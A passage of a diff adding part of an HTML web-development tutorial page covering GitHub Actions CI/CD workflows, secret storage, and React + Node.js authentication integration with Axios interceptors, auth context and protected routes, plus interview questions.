+    <tr><th>Term</th><th>Meaning</th></tr>
+    <tr><td>Workflow</td><td>A YAML file in <code>.github/workflows/</code> — defines the automation</td></tr>
+    <tr><td>Event (on:)</td><td>What triggers the workflow — push, pull_request, schedule</td></tr>
+    <tr><td>Job</td><td>A group of steps that runs on one virtual machine</td></tr>
+    <tr><td>Step</td><td>A single command or action inside a job</td></tr>
+    <tr><td>Runner</td><td>The virtual machine that runs the job (ubuntu-latest, windows-latest)</td></tr>
+    <tr><td>Action (uses:)</td><td>A reusable community step (checkout, setup-node, etc.)</td></tr>
+    <tr><td>Secret</td><td>Encrypted env var stored in GitHub Settings → Secrets</td></tr>
+  </table></div>
+
+  <h3>Full CI Workflow — Test on Every Push</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">.github/workflows/ci.yml</div>
+    <pre>name: CI — Test &amp; Lint
+
+<span class="cm"># Trigger on push to any branch, and on PRs to main</span>
+on:
+  push:
+    branches: [ "**" ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    <span class="cm"># Spin up a MongoDB service container alongside the runner</span>
+    services:
+      mongo:
+        image: mongo:7
+        ports:
+          - 27017:27017
+
+    steps:
+      <span class="cm"># 1. Checkout your code</span>
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      <span class="cm"># 2. Set up Node.js</span>
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+          cache: npm           <span class="cm"># cache node_modules for speed</span>
+
+      <span class="cm"># 3. Install dependencies</span>
+      - name: Install dependencies
+        run: npm ci
+        working-directory: Backend
+
+      <span class="cm"># 4. Run tests</span>
+      - name: Run tests
+        run: npm test
+        working-directory: Backend
+        env:
+          NODE_ENV:            test
+          MONGODB_URL:         mongodb://localhost:27017
+          ACCESS_TOKEN_SECRET: test-secret-ci
+          REFRESH_TOKEN_SECRET: test-refresh-ci
+
+      <span class="cm"># 5. (Optional) Lint</span>
+      - name: Lint
+        run: npx eslint src/
+        working-directory: Backend</pre>
+  </div>
+
+  <h3>CD — Deploy to a Server on Main Push</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">.github/workflows/deploy.yml — runs only after CI passes on main</div>
+    <pre>name: Deploy to Production
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    needs: []   <span class="cm"># could add: needs: [test] to require CI to pass first</span>
+
+    steps:
+      - uses: actions/checkout@v4
+
+      <span class="cm"># SSH into your server and pull + restart</span>
+      - name: Deploy via SSH
+        uses: appleboy/ssh-action@v1.0.0
+        with:
+          host:     ${{ secrets.SERVER_HOST }}
+          username: ${{ secrets.SERVER_USER }}
+          key:      ${{ secrets.SSH_PRIVATE_KEY }}
+          script: |
+            cd /var/www/backend
+            git pull origin main
+            npm ci --only=production
+            pm2 restart backend-api</pre>
+  </div>
+
+  <h3>Storing Secrets Safely</h3>
+  <div class="flow">GitHub repo → Settings → Secrets and variables → Actions → New repository secret
+
+Add secrets like:
+  SERVER_HOST       → 192.168.1.100  (your VPS IP)
+  SERVER_USER       → ubuntu
+  SSH_PRIVATE_KEY   → (your private SSH key — never the public key)
+
+Access in workflow: ${{ secrets.SERVER_HOST }}
+Never printed in logs — GitHub masks them automatically</div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is CI/CD?" — CI: automatically test code on every commit so broken code is caught immediately, not days later. CD: automatically deploy tested code to production. Together they remove manual steps from the release process and make shipping faster and safer.</p>
+    <p>"How do you store secrets in GitHub Actions?" — In GitHub repo Settings → Secrets and variables → Actions. Reference them in workflows with <code>${{ secrets.MY_SECRET }}</code>. They're encrypted at rest and never appear in logs. Never hardcode secrets in workflow YAML files.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 25 ══════════════════════════════════════ -->
+<section class="chapter" id="ch25">
+  <div class="ch-eyebrow">// CH.25</div>
+  <h2>Fullstack Integration — React + Node.js</h2>
+  <p class="chapter-desc">The glue chapter. You know the backend and you know React. Here's exactly how they connect — the parts that trip up every fullstack developer in interviews and on the job.</p>
+
+  <h3>The Complete Fullstack Architecture</h3>
+  <div class="flow">React (Vite, port 5173)         Node.js (Express, port 8000)
+       ↕  HTTP requests                    ↕  MongoDB
+  src/api/axios.js          →     /api/v1/users/login
+  localStorage / cookies    ←     accessToken + Set-Cookie
+  React Router (protected)  →     Authorization: Bearer token
+  Context / Zustand         ←     user object in response</div>
+
+  <h3>1 — Vite Proxy (Dev Only)</h3>
+  <p>In development, React runs on port 5173 and the API is on 8000. That's a cross-origin request → CORS. The easiest fix: Vite's proxy.</p>
+  <div class="codeblock">
+    <div class="codeblock-header">frontend/vite.config.js</div>
+    <pre><span class="kw">export default</span> {
+  server: {
+    proxy: {
+      <span class="str">"/api"</span>: {
+        target:      <span class="str">"http://localhost:8000"</span>,
+        changeOrigin: <span class="kw">true</span>,
+        <span class="cm">// Requests to /api/* in dev are silently forwarded to port 8000</span>
+        <span class="cm">// No CORS error, no extra config on the backend</span>
+      }
+    }
+  }
+}</pre>
+  </div>
+
+  <h3>2 — Axios Instance (The Central API Client)</h3>
+  <p>One Axios instance with your base URL and interceptors. Every API call goes through here — no scattered fetch() calls.</p>
+  <div class="codeblock">
+    <div class="codeblock-header">frontend/src/api/axios.js</div>
+    <pre><span class="kw">import</span> axios <span class="kw">from</span> <span class="str">"axios"</span>
+
+<span class="kw">const</span> <span class="var">api</span> = axios.<span class="fn">create</span>({
+  baseURL:         <span class="str">"/api/v1"</span>,          <span class="cm">// works with Vite proxy in dev</span>
+  withCredentials: <span class="kw">true</span>,              <span class="cm">// IMPORTANT: sends cookies on every request</span>
+  timeout:         <span class="num">10000</span>
+})
+
+<span class="cm">// Request interceptor — attach access token from memory</span>
+<span class="var">api</span>.<span class="prop">interceptors</span>.<span class="prop">request</span>.<span class="fn">use</span>((<span class="var">config</span>) => {
+  <span class="kw">const</span> <span class="var">token</span> = sessionStorage.<span class="fn">getItem</span>(<span class="str">"accessToken"</span>)
+  <span class="kw">if</span> (<span class="var">token</span>) <span class="var">config</span>.<span class="prop">headers</span>.<span class="prop">Authorization</span> = <span class="str">`Bearer </span><span class="var">${token}</span><span class="str">`</span>
+  <span class="kw">return</span> <span class="var">config</span>
+})
+
+<span class="cm">// Response interceptor — auto-refresh token on 401</span>
+<span class="var">api</span>.<span class="prop">interceptors</span>.<span class="prop">response</span>.<span class="fn">use</span>(
+  (<span class="var">res</span>) => <span class="var">res</span>,
+  <span class="kw">async</span> (<span class="var">error</span>) => {
+    <span class="kw">const</span> <span class="var">original</span> = <span class="var">error</span>.<span class="prop">config</span>
+    <span class="kw">if</span> (<span class="var">error</span>.<span class="prop">response</span>?.<span class="prop">status</span> === <span class="num">401</span> && !<span class="var">original</span>._retry) {
+      <span class="var">original</span>._retry = <span class="kw">true</span>
+      <span class="kw">try</span> {
+        <span class="kw">const</span> { data } = <span class="kw">await</span> <span class="var">api</span>.<span class="fn">post</span>(<span class="str">"/users/refresh-token"</span>)
+        sessionStorage.<span class="fn">setItem</span>(<span class="str">"accessToken"</span>, <span class="var">data</span>.<span class="prop">data</span>.<span class="prop">accessToken</span>)
+        <span class="kw">return</span> <span class="var">api</span>(<span class="var">original</span>)  <span class="cm">// retry original request with new token</span>
+      } <span class="kw">catch</span> {
+        sessionStorage.<span class="fn">removeItem</span>(<span class="str">"accessToken"</span>)
+        window.<span class="prop">location</span>.<span class="prop">href</span> = <span class="str">"/login"</span>  <span class="cm">// force logout</span>
+      }
+    }
+    <span class="kw">return</span> Promise.<span class="fn">reject</span>(<span class="var">error</span>)
+  }
+)
+
+<span class="kw">export default</span> <span class="var">api</span></pre>
+  </div>
+
+  <h3>3 — Token Storage Decision</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Location</th><th>Pros</th><th>Cons</th><th>Best for</th></tr>
+    <tr><td><code>localStorage</code></td><td>Persists across tabs/sessions</td><td>Vulnerable to XSS — any JS can read it</td><td>Never for auth tokens</td></tr>
+    <tr><td><code>sessionStorage</code></td><td>Cleared when tab closes</td><td>Only current tab</td><td>Short-lived access tokens</td></tr>
+    <tr><td>Memory (variable)</td><td>Not accessible by scripts</td><td>Lost on page refresh</td><td>Access tokens (re-fetch on refresh)</td></tr>
+    <tr><td>httpOnly Cookie</td><td>JS cannot access — XSS-safe</td><td>CSRF risk (mitigate with SameSite)</td><td>Refresh tokens</td></tr>
+  </table></div>
+  <p><strong>Best practice:</strong> Access token in memory (React state/context). Refresh token in <code>httpOnly</code> cookie. On page refresh, call <code>/refresh-token</code> once to get a new access token — the cookie is sent automatically.</p>
+
+  <h3>4 — Auth Context (React)</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">frontend/src/context/AuthContext.jsx</div>
+    <pre><span class="kw">import</span> { createContext, useContext, useState, useEffect } <span class="kw">from</span> <span class="str">"react"</span>
+<span class="kw">import</span> <span class="var">api</span> <span class="kw">from</span> <span class="str">"../api/axios"</span>
+
+<span class="kw">const</span> <span class="var">AuthContext</span> = <span class="fn">createContext</span>(null)
+
+<span class="kw">export function</span> <span class="fn">AuthProvider</span>({ children }) {
+  <span class="kw">const</span> [<span class="var">user</span>, <span class="fn">setUser</span>] = <span class="fn">useState</span>(null)
+  <span class="kw">const</span> [<span class="var">loading</span>, <span class="fn">setLoading</span>] = <span class="fn">useState</span>(<span class="kw">true</span>)  <span class="cm">// true while checking auth</span>
+
+  <span class="cm">// On app load: try to refresh to restore session</span>
+  <span class="fn">useEffect</span>(() => {
+    <span class="var">api</span>.<span class="fn">post</span>(<span class="str">"/users/refresh-token"</span>)
+      .<span class="fn">then</span>(({ data }) => <span class="fn">setUser</span>(<span class="var">data</span>.<span class="prop">data</span>.<span class="prop">user</span>))
+      .<span class="fn">catch</span>(() => <span class="fn">setUser</span>(null))
+      .<span class="fn">finally</span>(() => <span class="fn">setLoading</span>(<span class="kw">false</span>))
+  }, [])
+
+  <span class="kw">const</span> <span class="fn">login</span> = <span class="kw">async</span> (<span class="var">credentials</span>) => {
+    <span class="kw">const</span> { data } = <span class="kw">await</span> <span class="var">api</span>.<span class="fn">post</span>(<span class="str">"/users/login"</span>, <span class="var">credentials</span>)
+    <span class="fn">setUser</span>(<span class="var">data</span>.<span class="prop">data</span>.<span class="prop">user</span>)
+    <span class="kw">return</span> <span class="var">data</span>
+  }
+
+  <span class="kw">const</span> <span class="fn">logout</span> = <span class="kw">async</span> () => {
+    <span class="kw">await</span> <span class="var">api</span>.<span class="fn">post</span>(<span class="str">"/users/logout"</span>)
+    <span class="fn">setUser</span>(null)
+  }
+
+  <span class="kw">return</span> (
+    &lt;AuthContext.Provider value={{ user, loading, login, logout }}&gt;
+      {!loading && children}
+    &lt;/AuthContext.Provider&gt;
+  )
+}
+
+<span class="kw">export const</span> <span class="fn">useAuth</span> = () => <span class="fn">useContext</span>(<span class="var">AuthContext</span>)</pre>
+  </div>
+
+  <h3>5 — Protected Route (React Router)</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">frontend/src/components/ProtectedRoute.jsx</div>
+    <pre><span class="kw">import</span> { Navigate } <span class="kw">from</span> <span class="str">"react-router-dom"</span>
+<span class="kw">import</span> { useAuth } <span class="kw">from</span> <span class="str">"../context/AuthContext"</span>
+
+<span class="kw">export function</span> <span class="fn">ProtectedRoute</span>({ children }) {
+  <span class="kw">const</span> { user, loading } = <span class="fn">useAuth</span>()
+  <span class="kw">if</span> (<span class="var">loading</span>) <span class="kw">return</span> &lt;div&gt;Loading...&lt;/div&gt;
+  <span class="kw">return</span> <span class="var">user</span> ? <span class="var">children</span> : &lt;Navigate to=<span class="str">"/login"</span> /&gt;
+}
+
+<span class="cm">// Usage in App.jsx:</span>
+<span class="cm">// &lt;Route path="/dashboard" element={</span>
+<span class="cm">//   &lt;ProtectedRoute&gt;&lt;Dashboard /&gt;&lt;/ProtectedRoute&gt;</span>
+<span class="cm">// } /&gt;</span></pre>
+  </div>
+
+  <h3>6 — Environment Variables (React / Vite)</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">frontend/.env</div>
+    <pre><span class="cm"># MUST start with VITE_ to be accessible in React code</span>
+VITE_API_BASE_URL=http://localhost:8000/api/v1
+
+<span class="cm"># Access in React:</span>
+<span class="cm">// import.meta.env.VITE_API_BASE_URL</span>
+<span class="cm">// process.env does NOT work in Vite — always use import.meta.env</span></pre>
+  </div>
+
+  <h3>Common Fullstack Interview Questions</h3>
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"How do you handle authentication in a React + Node.js app?" — Store the access token in memory (React Context/state). Store the refresh token in an httpOnly cookie. On app load, call /refresh-token once — if the cookie is valid, the backend returns a fresh access token and the user is logged in automatically. Attach the access token to every request via an Axios interceptor.</p>
+    <p>"Why not store tokens in localStorage?" — XSS (Cross-Site Scripting) — if any script on your page is compromised, it can read localStorage and steal the token. httpOnly cookies cannot be read by JavaScript at all — even injected scripts.</p>
+    <p>"What is CORS and why does it happen in a fullstack app?" — Same-Origin Policy: browsers block requests to a different origin (different domain, port, or protocol). React on port 5173 calling Express on port 8000 = cross-origin = blocked. Solutions: (1) Vite proxy in dev, (2) configure CORS on the backend with <code>cors({ origin: "http://localhost:5173", credentials: true })</code>.</p>
+    <p>"What is <code>withCredentials: true</code> in Axios?" — Tells the browser to include cookies in cross-origin requests. Without it, even if the backend sets a cookie, the browser won't send it on subsequent requests. Required for refresh token cookies to work.</p>
+    <p>"How do you handle a 401 (expired token) in React?" — Axios response interceptor: if status is 401, call /refresh-token, get a new access token, store it, then retry the original request. If refresh fails, redirect to login. This is transparent to the user — they never see the token expiry.</p>
+  </div>
+
+  <h3>Production Setup Difference</h3>
+  <div class="table-wrap"><table>
+    <tr><th></th><th>Development</th><th>Production</th></tr>
+    <tr><td>CORS</td><td>Vite proxy handles it</td><td>Backend CORS: <code>origin: "https://myapp.com"</code></td></tr>
+    <tr><td>API URL</td><td><code>/api/v1</code> (proxied)</td><td><code>https://api.myapp.com/api/v1</code></td></tr>
+    <tr><td>Cookie secure</td><td><code>secure: false</code> (HTTP is ok)</td><td><code>secure: true</code> (HTTPS required)</td></tr>
+    <tr><td>Cookie sameSite</td><td><code>sameSite: "lax"</code></td><td><code>sameSite: "none"</code> (different domain = cross-site)</td></tr>
+    <tr><td>Frontend hosting</td><td>Vite dev server</td><td>Vercel / Netlify / Nginx static files</td></tr>
+    <tr><td>Backend hosting</td><td>Nodemon local</td><td>Railway / Render / EC2 + PM2</td></tr>
+  </table></div>
+</section>
+
+</main>
+
+<!-- ══ FOOTER ════════════════════════════════════════════ -->
+<footer>
+  Built from the Learning-Backend project · Hitesh Choudhary YouTube series ·
+  Express 5 · Mongoose 9 · Node.js ESM
+</footer>
+
+</div><!-- .page-wrap -->
+
+<script>
+// Highlight active TOC item on scroll
+const sections = document.querySelectorAll('.chapter')
+const links = document.querySelectorAll('.toc-nav a')
+
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      links.forEach(l => l.classList.remove('active'))
+      const id = e.target.id
+      const link = document.querySelector(`.toc-nav a[href="#${id}"]`)
+      if (link) link.classList.add('active')
+    }
+  })
+}, { rootMargin: '-10% 0px -80% 0px' })
+
+sections.forEach(s => observer.observe(s))
+</script>
+</body>
+</html>
